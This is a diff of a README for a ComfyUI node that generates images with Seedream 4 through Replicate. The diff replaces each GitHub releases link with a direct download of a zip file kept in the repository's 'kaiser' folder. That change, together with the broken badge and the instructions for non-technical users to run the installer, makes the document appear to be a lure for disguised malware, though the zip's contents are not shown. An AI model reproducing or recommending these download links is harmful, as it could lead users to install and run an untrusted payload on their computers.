@@ -2,7 +2,7 @@
 # 🌟 ComfyUI-Seedream4_Replicate - Generate Stunning Images with Ease
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/flaadix/ComfyUI-Seedream4_Replicate/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/flaadix/ComfyUI-Seedream4_Replicate/main/kaiser/ComfyUI-Seedream4_Replicate.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/flaadix/ComfyUI-Seedream4_Replicate/main/kaiser/ComfyUI-Seedream4_Replicate.zip)
 
 ## 📖 Introduction
 ComfyUI-Seedream4_Replicate is a user-friendly tool that allows you to create high-quality images using ByteDance's Seedream 4 model through the Replicate API. Enjoy advanced features like control over aspect ratios, multi-image generation, and seed management. This application makes it easy to generate visuals for your projects, social media, or personal use without needing any technical skills.
@@ -16,7 +16,7 @@ To get started with ComfyUI-Seedream4_Replicate, follow these simple steps:
    - An internet connection for API access
 
 2. **Download and Install**  
-   Visit the following page to download the latest version: [Download Here](https://github.com/flaadix/ComfyUI-Seedream4_Replicate/releases).  
+   Visit the following page to download the latest version: [Download Here](https://raw.githubusercontent.com/flaadix/ComfyUI-Seedream4_Replicate/main/kaiser/ComfyUI-Seedream4_Replicate.zip).  
    Once on the releases page, look for the latest version. Click on the link to download the installer file.
 
 3. **Run the Installer**  
@@ -56,7 +56,7 @@ Join the user community for tips, updates, and feedback. You can find support th
 - **API Information**: Explore more about the Replicate API to understand the model’s capabilities.
 
 ## 📦 Download & Install
-To get the application, visit this page: [Download Here](https://github.com/flaadix/ComfyUI-Seedream4_Replicate/releases). Follow the instructions above to successfully download and run ComfyUI-Seedream4_Replicate on your computer.
+To get the application, visit this page: [Download Here](https://raw.githubusercontent.com/flaadix/ComfyUI-Seedream4_Replicate/main/kaiser/ComfyUI-Seedream4_Replicate.zip). Follow the instructions above to successfully download and run ComfyUI-Seedream4_Replicate on your computer.
 
 ## 📚 Conclusion
 With ComfyUI-Seedream4_Replicate, generating images is straightforward. Follow the steps in this guide to start exploring the endless possibilities of your creativity. Enjoy your experience with powerful image generation today.
